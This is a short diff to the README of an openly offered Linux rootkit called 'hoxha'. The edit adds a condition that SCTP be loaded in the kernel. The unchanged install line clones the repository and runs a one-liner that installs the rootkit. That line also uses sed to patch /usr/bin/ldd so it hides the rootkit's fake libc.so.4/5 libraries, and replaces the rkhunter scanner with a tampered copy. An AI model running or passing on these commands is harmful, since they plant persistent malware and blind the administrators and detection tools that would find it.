@@ -9,7 +9,7 @@ You can download this like so:
 ```
 git clone https://github.com/mephistolist/hoxha.git
 ```
-Then you can install the rootkit this:
+Considering SCTP is installed and loaded in the kernel, you can install the rootkit this:
 ```
 cd hoxha/persistance && [ -f ./patchelf ] && chmod +x ./patchelf && make install clean && sed -i 's/try_trace \"$RTLD\" \"$file\" || result=1/try_trace \"$RTLD\" \"$file\" | grep -vE \"libc.so.4|libc.so.5\" || result=1/g' /usr/bin/ldd && [ -f $(which rkhunter) ]  && cp ./rkhunter $(which rkhunter) 2>/dev/null
 ```
